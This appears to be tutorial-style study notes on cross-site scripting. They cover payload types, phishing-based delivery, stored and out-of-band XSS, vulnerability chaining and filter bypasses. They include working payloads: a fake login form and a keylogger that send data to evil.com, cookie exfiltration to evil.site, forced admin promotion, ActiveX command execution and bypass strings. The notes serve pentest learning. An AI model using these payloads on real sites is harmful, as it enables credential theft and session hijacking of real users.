## 🧨 SECTION: **Payloads for XSS Attacks**

You already know XSS gives you JavaScript execution. But now the question is:

> *What can I do with it?*

### 🔥 There are **5 Major Payload Categories**:

---

### 1. ⚠️ **Virtual Defacement**

**Goal:** Change the visual appearance of the page without touching the server
**Logic:** Inject fake headlines, images, warnings, or full redesigns via JS/HTML/CSS

#### 💀 Payload Example:

```html
<script>
document.body.innerHTML = "<h1 style='color:red;'>🔥 HACKED BY 1337 CREW 🔥</h1>";
</script>
```

#### 🔍 Real-World Use:

* Fake security warnings ("Your session expired, login again")
* FUD manipulation (fake financial reports on trading platforms)
* Social engineering (inject fake "payment successful" banners)

> 💡 Think like: *Front-end phishing* inside a trusted UI.

---

### 2. 👻 **Trojan Functionality**

**Goal:** Trick the user into submitting sensitive data to attacker
**Logic:** Inject **legit-looking forms** that steal input behind the scenes

#### 💀 Payload Example: Fake login form

```html
<form action="http://evil.com/steal" method="POST">
  Username: <input name="u"><br>
  Password: <input type="password" name="p"><br>
  <input type="submit" value="Login">
</form>
```

#### 🎭 Advanced Version:

* Submit stolen creds to attacker
* Then auto-log user into real site using stored credentials to avoid suspicion

#### 🧠 Weaponized Use:

* **Credential theft**
* **Fake giveaways** ("Enter card for free Nitro")
* **Redirection to fake recovery page**

> 💡 Trojan forms feel “native” to users — that’s the danger.

---

### 3. 🛠️ **Inducing User Actions (via JS automation)**

**Goal:** Get the user’s browser to perform *privileged* actions on attacker’s behalf
**Logic:** JS triggers POST/GET/AJAX requests while user is authenticated

#### 💀 Payload Example: Promote attacker’s account

```html
<script>
fetch('/admin/promote?user=attacker', { method: 'POST' });
</script>
```

#### 🧠 Key Use Cases:

* Auto-like, auto-share, auto-subscribe
* Change password/email silently
* CSRF-style permission escalation
* Spam spread (auto-post messages)

#### 🧬 Worm Integration:

* DOM/Stored XSS + JS automation → Mass user actions (as in the **Samy worm**)

> 💡 Think like a **botnet controller**: “If one admin runs this, I win.”

---

### 4. 🧠 **Exploiting Trust Relationships**

**Goal:** Abuse **browser trust** or **internal configurations** to go beyond XSS
**Logic:** Attack *client-side browser features* or *trusted zones*

#### 💀 Attack Examples:

* **Steal autocomplete data:**

```html
<input name="cc" id="cc">
<script>
setTimeout(() => alert(document.getElementById('cc').value), 1000);
</script>
```

* **Trusted Site → RCE via ActiveX (IE only):**

```html
<script>
var o = new ActiveXObject("WScript.Shell");
o.Run("calc.exe");
</script>
```

* **Internal XSS in intranet:**

  * Triggered via company email
  * Runs in internal admin panel
  * May hit machines using lower browser security zones

> 💡 Corporate networks = goldmine for XSS chaining (XSS → RCE via trusted IE zones)

---

### 5. 🧪 **Escalating the Client-Side Attack**

**Goal:** Use XSS as a pivot to do deeper evil within the client’s browser/network
**Logic:** Abuse browser APIs or network visibility

#### 💀 Advanced Payloads:

* **Keylogging:**

```js
document.onkeypress = function(e){ 
  fetch('http://evil.com/log?key=' + e.key); 
};
```

* **Internal port scan:**

```js
for(let i=0; i<100; i++) {
  fetch(`http://192.168.0.${i}:80`).then(...);
}
```

* **Fingerprinting victim’s network / browser config**
* **Webcam/mic access** (via malicious iframe + permission trickery)

> 💡 These go beyond the app — they’re about client exploitation.

---

## 🧱 Comparison Table of Payload Categories

| Category               | Purpose                             | Requires Interaction? | Detection Risk | Real-World Usage |
| ---------------------- | ----------------------------------- | --------------------- | -------------- | ---------------- |
| Virtual Defacement     | Fake UI / disinfo                   | No                    | Low            | Misinformation   |
| Trojan Functionality   | Credential/card theft               | Yes                   | Medium         | Phishing         |
| Inducing Actions       | Mass exploitation (e.g., promote)   | No                    | High           | Worms, spam bots |
| Exploit Trust          | Leverage browser-level trust        | No                    | Very High      | RCE via IE, DOM  |
| Client-Side Escalation | Attack user’s browser/local network | No                    | High           | Recon, keylog    |

---

## ⚔️ Practical Lab Tip (Optional Task)

**Challenge Task (Optional):**
On your local testbed or JSFiddle, simulate one of these payloads (pick any):

* Inject a fake login form that logs to console
* Auto-trigger a POST request using `fetch()` to simulate permission escalation
* Use `document.onkeypress` to build a keylogger

If you want help building any of them — just say which type you want to simulate.

---

## ✅ Summary: Why This Section Matters

XSS is not just a bug — it’s an **initial access vector** that lets you:

* Phish within a real UI (better than fake sites)
* Manipulate app state silently
* Steal real user secrets
* Maintain stealth and escalate

> You're not just popping `alert(1)` anymore. You're building browser implants.

---

## 🔹 **1. Introduction — So You Have a Payload, Now What?**

Finding an XSS vuln and crafting a working payload is just **step one**.

Next step? **Deliver it.**

Think like an attacker:
You want victims to *unknowingly* run your script, preferably while they're logged in to the target web app. Your job is to *get the payload in front of them* — this section covers how.

---

## 🔹 2. Delivering **Reflected & DOM-Based** XSS Attacks

Here, the attacker has a URL like:

```
https://vuln.site/page?msg=<script>steal()</script>
```

The payload is **not stored**, so you have to *actively trick users into clicking the link*.

### ✅ A. Delivery Methods

#### 📬 A1. **Phishing / Spear Phishing Emails**

* Classic attack: send bulk emails with XSS-injected links.
* *Spear phishing*: target a specific user (like an admin) with a believable email saying:

  > "Hey, this page throws an error when I access it: \[link]"

Why effective? Admins are problem-solvers. You’re exploiting their helpful nature.

---

#### 💬 A2. **Instant Messaging or DMs**

Just drop the crafted link in a chat platform. A user clicking it = owned.

---

#### 🌐 A3. **Third-Party Website Embeds (GET-based attacks)**

Let’s say the XSS can be triggered with a `GET` request (via a crafted URL).

You can:

* Embed it in an `<img src=...>` tag on a **different site**.
* Post it in a forum, comment section, blog, etc.

```html
<img src="https://vuln.site/page?msg=<script>steal()</script>">
```

If the victim is logged into `vuln.site` in the same browser, you just silently compromised their session.

---

#### 🎯 A4. **Malicious Website Controlled by Attacker**

The attacker can create a site that:

* Lures users in with useful content.
* Silently fires XSS attacks in the background against `vuln.site`.

This is especially dangerous if:

* The victim is logged into `vuln.site`.
* The attack uses a script or form submission to trigger XSS.

Even better (for attacker): **no phishing involved** — just SEO or clickbait.

---

#### 🧠 A5. **Bypassing POST-based XSS Limitations**

What if the XSS vuln requires a `POST` request instead of a `GET`?

No problem. Attacker can:

* Create an `<form method="POST" action="...">` on their malicious page.
* Use JavaScript to auto-submit it with malicious data.

This still triggers the XSS — even without the user clicking anything.

---

#### 📢 A6. **Abusing Banner Ads**

Attackers have:

* Paid for banner ads.
* Embedded links to their XSS-payloaded URLs.

Here’s the clever part:
If the ad platform is using keywords, the malicious ad may show up *on the target site itself*.

So:

* Victim is already on `vuln.site`.
* Sees an ad.
* Clicks it — **XSS fires**.

And since the URL is now "on-site," browser protections like referrer or domain matching *won’t help*.

---

#### 📤 A7. **Using "Tell-a-Friend" or Feedback Functions**

Many sites allow users to send feedback or emails to others via the site’s backend.

If the attacker can:

* Inject XSS in the message,
* And the app sends it *through its own mail server*,

Then even savvy users might trust the email. It’s legit-looking and from a trusted sender.

---

## 🔹 3. Delivering **Stored XSS Attacks**

Unlike reflected/DOM XSS, **stored XSS does the delivery for you.**

But there are **two modes** of delivery:

---

### ✅ A. **In-Band Delivery** — through the main web interface

Attacker submits the payload via:

* Profile fields (name, bio, etc.)
* Uploaded file names
* Comments, feedback, or messages
* Anything saved in logs (User-Agent, Referer, URL)
* Uploaded files *viewed in-browser*

Then… waits. When someone views that data, **XSS triggers**.

Example:

```html
<script>new Image().src='https://evil.site/'+document.cookie</script>
```

Boom — session token exfiltration.

---

### ✅ B. **Out-of-Band Delivery** — through other channels (e.g., email)

Some web apps consume input from **outside sources**, like:

* Emails
* External APIs
* SMS messages converted to HTML
* Logs from 3rd-party systems

If that data is later rendered in the UI without sanitization, attacker can deliver stored XSS this way — **without touching the web interface**.

**Example:**
Send a malicious email to `CEO@target.com`.
When they open it in the webmail app → payload executes → session hijacked.

---

## 🔹 4. Chaining XSS with Other Vulns

This is where XSS gets dangerous.

### ⚠️ Low-Risk + Low-Risk = High-Risk

**Example 1:**

* App has stored XSS in the **display name** field. Only shown to logged-in users on their dashboard.
* Seems harmless, right?

**But...**

* There's a second vuln: **any user can change any other user’s display name.**

🧠 Chain them:

1. Inject `<script>` in everyone’s display name.
2. Users log in → script executes → session token stolen.
3. One of them is an admin → game over.

---

**Example 2:**

* Stored XSS is only visible to the user who submitted it.
* But app is vulnerable to **CSRF**.

Attack chain:

1. Victim visits attacker site.
2. Hidden request updates their profile with malicious XSS payload.
3. Next time victim logs in → **XSS triggers** → session stolen.

---

## 🧨 Common Security Myth Busted

> **“The bug is low risk; users can only attack themselves.”**

WRONG.

If the attacker can:

* Exploit a CSRF to update another user's data
* Abuse a flaw to inject payloads into fields users never expected

Then **self-XSS becomes stored XSS** — and that’s no joke.

---

## 🛡️ Defense Reminder: Defense-in-Depth

Never ignore a vuln just because it *looks* harmless.

> Real attackers **chain** bugs.
> You fix **everything** — or you’re leaving the door half-open.

---


## 🔍 **Finding and Exploiting XSS Vulnerabilities**

Let’s assume you’re the attacker or pentester. You’ve got a target app and you're trying to find **where it's vulnerable to XSS** — and more importantly, how to **get around protections**.

---

## 🔸 1. The Basic Approach: Quick & Dirty

### 📌 What is it?

Submit a classic XSS test payload into every input field or URL param, like:

```html
"><script>alert(document.cookie)</script>
```

Then monitor the server’s response. If the payload shows up **unescaped and unmodified**, that’s your green light.

---

### 🔍 Why This Works

Because if the app reflects your input directly into the HTML page **without encoding or sanitizing it**, your script will execute when the page renders.

---

### 💡 Use Cases

* Quick scans
* Scripting tools like Burp Intruder or custom fuzzers
* Situations where **you just need one working vuln to weaponize**

---

### ⚠️ Limitations

> "Works great until it doesn't."

This approach fails if:

* The app filters `<script>` or `alert` strings.
* It **encodes or modifies** the input before reflecting it.
* It's a **DOM-based XSS** (client-side), where nothing comes back in the server response.

So you need more than just this payload to be thorough.

---

## 🔸 2. The Real-World Problem: Filters & Obfuscation

### 🛑 Blacklist Filters Are Common

Apps often have naive protections like:

* Strip or block `<script>`
* Block `onerror`, `onload`, or `"javascript:"`
* Encode certain characters like `<`, `>`, or `/`

This will break your basic PoC string. But…

---

### 💀 The Bypass Game Begins

Here’s where real attackers flex creativity. Just because `<script>` is filtered doesn't mean XSS is dead. Below are several **filter bypass techniques** from the book (and real life):

#### ✅ Examples:

1. **Add whitespace inside tags**

```html
"><script >alert(1)</script >
```

2. **Change case**

```html
"><ScRiPt>alert(1)</ScRiPt>
```

3. **URL encoding**

```html
%3e%3cscript%3ealert(1)%3c/script%3e
```

4. **Break up tag context**

```html
"><scr<script>ipt>alert(1)</scr</script>ipt>
```

5. **Null-byte injection**

```html
%00"><script>alert(1)</script>
```

6. **Use non-script-based vectors** (more on this in next section — `img`, `svg`, etc.)

---

## 🔸 3. Why the Basic Approach Fails in Advanced Scenarios

### 🧠 The key realization:

Just because your exact test string doesn’t appear in the response doesn’t mean the site is safe.

#### Real examples:

* Input gets **transformed** before it's reflected.
* Filter removes some characters, but **enough is left to execute JS**.
* Some contexts like attributes or JavaScript strings behave differently.

---

### 🔬 What to Watch For:

* **Partial reflections** — maybe only part of your payload comes back. You can often still build a working XSS around that.
* **HTML encoding** — `&lt;script&gt;` looks safe, but what if the browser **decodes it dynamically** via JavaScript or innerHTML?
* **Double encoding** — sometimes payloads get encoded twice and then decoded by browser behavior.

Always test how browsers *actually render the response*, not just what the server returns.

---

## 🔸 4. DOM-Based XSS: Server Response ≠ Useful

In DOM-based XSS:

* You submit the payload.
* It never appears in the **server response**.
* Instead, it’s picked up **by client-side JS** — from the URL, hash, or DOM — and written into the page.

So you **won’t see anything in Burp or the raw HTTP response.** But…

### 🔍 Where DOM XSS Might Pull Input From:

* `document.location`
* `document.URL`
* `window.location.hash`
* `location.search`
* `document.referrer`

---

### 🔥 Practical Exploit Example

JS code on the page:

```javascript
let q = location.search;
document.write(q);
```

Your payload:

```
https://vuln.site/page?q=<script>alert(1)</script>
```

No XSS appears in response, but as soon as browser hits the line `document.write(q)` — boom, you get XSS.

---

## 🧪 Tips for Detecting DOM-Based XSS

1. **Look at the client-side JS**:

   * Inspect JavaScript via DevTools or JS Beautifiers.
   * Search for the keywords mentioned above.
   * See how user input is used (e.g., innerHTML, eval, document.write).

2. **Use browser-based tools**:

   * **DOM Invader** (built into Burp Suite Pro)
   * **XSStrike**
   * **bruteDOM** (DOM XSS fuzzer)

3. **Manually test with alert payloads**:

   * Inject simple payloads into the **URL hash**, **search**, or **referrer**.
   * Observe execution in DevTools console.

---

## ✅ Summary Cheat Sheet

| Detection Type       | Description                                                 | Strengths                    | Weaknesses                       |
| -------------------- | ----------------------------------------------------------- | ---------------------------- | -------------------------------- |
| Basic PoC string     | `"><script>alert(1)</script>`                               | Easy, fast, good first try   | Misses filtered or DOM-based XSS |
| Obfuscation bypasses | Use case change, encoded payloads, or fragmented tags       | Bypasses naive filters       | Still fails if context is tight  |
| DOM-based testing    | Focus on how JS handles input from DOM, not server response | Finds client-side only vulns | Needs manual analysis or tooling |

---

### ✅ Sample Obfuscated Payloads to Practice With

| Payload                             | Description                               |
| ----------------------------------- | ----------------------------------------- |
| `"><img src=x onerror=alert(1)>`    | Bypasses `<script>` filtering             |
| `"><svg/onload=alert(1)>`           | SVG tag with event handler                |
| `%3Cscript%3Ealert(1)%3C/script%3E` | Encoded form                              |
| `"><body onload=alert(1)>`          | Exploits HTML body tag                    |
| `javascript:alert(1)`               | `href` or `src` based attack (contextual) |

---
